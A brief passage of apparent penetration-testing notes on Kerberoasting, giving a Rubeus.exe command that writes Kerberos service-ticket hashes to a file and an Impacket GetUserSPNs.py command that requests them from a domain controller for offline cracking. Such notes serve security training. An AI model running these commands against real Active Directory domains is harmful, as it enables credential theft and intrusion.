> We can Rubeus.exe on windows to perform Kerberoasting:

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Here it outputs the hash to our file and now we can crack the hash after copying it to a file in Kali.

> On Kali we can use the following to perform this attack:

```
GetUserSPNs.py -request -dc-ip <DC_ip> <domain_name>/<username>:<password>
```
